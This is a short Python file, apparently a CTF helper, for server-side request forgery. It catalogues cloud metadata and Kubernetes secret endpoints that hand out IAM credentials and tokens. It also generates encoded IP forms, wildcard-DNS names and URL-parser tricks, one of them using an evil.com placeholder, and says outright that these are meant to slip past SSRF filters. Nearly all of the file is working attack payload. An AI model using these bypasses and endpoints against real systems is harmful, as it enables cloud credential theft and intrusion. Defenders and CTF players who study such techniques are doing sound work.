"""
SSRF (Server-Side Request Forgery) & IP Obfuscator for Web CTF challenges.
Converts IPs to Decimal, Hex, Octal, IPv6, and provides cloud metadata endpoints.
"""

import socket
import struct
from typing import List, Dict

CLOUD_METADATA_ENDPOINTS = [
    {
        "provider": "AWS EC2 (IMDSv1)",
        "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "desc": "AWS IAM role credentials and security tokens (IMDSv1 - no token required)."
    },
    {
        "provider": "AWS User-Data",
        "url": "http://169.254.169.254/latest/user-data",
        "desc": "Cloud initialization scripts often containing secrets and passwords."
    },
    {
        "provider": "Google Cloud (GCP)",
        "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "desc": "GCP Service account OAuth tokens (Requires Header: 'Metadata-Flavor: Google')."
    },
    {
        "provider": "Microsoft Azure",
        "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "desc": "Azure instance metadata (Requires Header: 'Metadata: true')."
    },
    {
        "provider": "DigitalOcean",
        "url": "http://169.254.169.254/metadata/v1.json",
        "desc": "DigitalOcean Droplet metadata and configuration."
    },
    {
        "provider": "Kubernetes API / Secrets",
        "url": "https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
        "desc": "Kubernetes default cluster service secrets."
    }
]

def ip_to_int(ip_str: str) -> int:
    """Convert IPv4 string to 32-bit integer."""
    packed = socket.inet_aton(ip_str)
    return struct.unpack("!I", packed)[0]

def obfuscate_ip(ip: str = "127.0.0.1") -> Dict[str, str]:
    """Generate all obfuscated representations of an IPv4 address to bypass SSRF filters."""
    results = {}
    try:
        octets = [int(x) for x in ip.split(".")]
        if len(octets) != 4:
            return {"Error": "Invalid IPv4 format"}
        
        integer_ip = (octets[0] << 24) + (octets[1] << 16) + (octets[2] << 8) + octets[3]
        
        results["Original IP"] = ip
        results["Decimal (Dotted)"] = f"{integer_ip}"
        results["Hex (Full)"] = f"0x{integer_ip:08x}"
        results["Hex (Dotted)"] = f"0x{octets[0]:02x}.0x{octets[1]:02x}.0x{octets[2]:02x}.0x{octets[3]:02x}"
        results["Octal (Dotted)"] = f"0{octets[0]:03o}.0{octets[1]:03o}.0{octets[2]:03o}.0{octets[3]:03o}"
        results["Short Localhost Formats"] = "127.1 / 127.0.1 / 0 / 0.0.0.0"
        results["IPv6 / Dual-Stack"] = f"::ffff:{ip} or [::1]"
        results["Wildcard DNS (nip.io)"] = f"{ip}.nip.io"
        results["Wildcard DNS (sslip.io)"] = f"{ip}.sslip.io"
        results["URL Parser Confusion (Auth Trick)"] = f"http://google.com@{ip}"
        results["URL Parser Confusion (Hash Trick)"] = f"http://{ip}#@google.com"
        results["URL Parser Confusion (Redirect)"] = f"http://localhost.evil.com"
    except Exception as e:
        results["Error"] = str(e)
    
    return results
